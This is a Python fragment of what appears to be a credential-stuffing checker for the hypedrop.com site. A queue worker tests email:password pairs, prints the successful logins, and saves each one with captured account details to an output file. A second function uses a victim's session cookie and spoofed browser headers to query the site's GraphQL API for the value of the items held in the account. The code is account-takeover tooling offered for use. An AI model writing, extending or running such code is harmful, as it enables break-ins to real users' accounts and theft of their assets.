def worker(queue, results):
    while True:
        try:
            email, password = queue.get()
            if email is None:
                break
                
            result = check_hypedrop(email, password)
            if result.get("success"):
                print(f"[+] Login successful for {email}!")
                print(f"[+] Capture: {result['capture']}")
                with open('./output/capture.txt', 'a') as f:
                    f.write(f"{email}:{password} | {result['capture']}\n")
            else:
                print(f"[-] Login failed for {email}: {result['message']}")
                
        except Exception as e:
            print(f"[!] Error processing {email}: {str(e)}")
        finally:
            queue.task_done()


def get_cart_level(id, session_cookie):
    try:
        cookies = {
            'session': session_cookie,
        }

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'apollographql-client-name': 'hypedrop-www',
            'apollographql-client-version': 'v367',
            'ngsw-bypass': 'true',
            'origin': 'https://www.hypedrop.com',
            'priority': 'u=1, i',
            'referer': 'https://www.hypedrop.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0',
        }

        response = requests.get(
            f'https://api.hypedrop.com/graphql?operationName=UserItemList&variables=%7B%22first%22:50,%22userId%22:%22{id}%22,%22orderBy%22:%22VALUE_DESC%22,%22status%22:%5B%22AVAILABLE%22%5D,%22includeMarketId%22:true%7D&extensions=%7B%22persistedQuery%22:%7B%22version%22:1,%22sha256Hash%22:%220ba9e378f0bad5fe0caaaf0c514270eac85fef722e57a7bdef47327ee020da13%22%7D%7D',
            cookies=cookies,
            headers=headers,
        )

        response_json = response.json()
        if not response_json.get('data', {}).get('userItems', {}).get('edges'):
            return 0
        cart_amount = response_json['data']['userItems']['edges'][0]['node']['consumeValueInUserCurrency']
        return cart_amount

    except Exception as e:
        print(f"Error getting cart level: {str(e)}")
        return 0


